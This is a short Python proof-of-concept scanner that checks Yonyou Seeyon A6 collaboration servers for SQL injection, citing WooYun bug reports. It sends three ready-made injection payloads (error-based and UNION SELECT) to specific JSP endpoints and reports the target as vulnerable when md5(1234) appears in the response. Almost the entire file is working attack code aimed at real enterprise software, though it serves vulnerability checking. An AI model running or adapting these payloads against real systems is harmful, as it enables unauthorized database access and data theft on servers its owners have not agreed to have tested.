#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 用友致远A6协同系统多处SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2015-0105502
         http://www.wooyun.org/bugs/wooyun-2015-0105709
         http://www.wooyun.org/bugs/wooyun-2015-0105497
author: Lucifer
description: 多处注入
'''
import sys
import requests
import warnings
def run(url):
        result = ['用友致远A6协同系统多处SQL注入','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
            }
        payloads = ["/yyoa/HJ/iSignatureHtmlServer.jsp?COMMAND=DELESIGNATURE&DOCUMENTID=1&SIGNATUREID=2%27AnD%20(SeLeCt%201%20FrOm%20(SeLeCt%20CoUnT(*),CoNcaT(Md5(1234),FlOoR(RaNd(0)*2))x%20FrOm%20InFoRmAtIoN_ScHeMa.TaBlEs%20GrOuP%20By%20x)a)%23",
                    "/yyoa/ext/trafaxserver/ToSendFax/messageViewer.jsp?fax_id=-1'UnIoN%20AlL%20SeLeCt%20NULL,Md5(1234),NULL,NULL%23",
                    "/yyoa/ext/trafaxserver/SendFax/resend.jsp?fax_ids=(1)%20AnD%201=2%20UnIon%20SeLeCt%20Md5(1234)%20--"]
        try:
            noexist = True
            for payload in payloads:
                vulnurl = url + payload
                req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
                if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                    result[2]=  '存在'
                    result[1] = vulnurl
                    noexist = False
            if noexist:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
    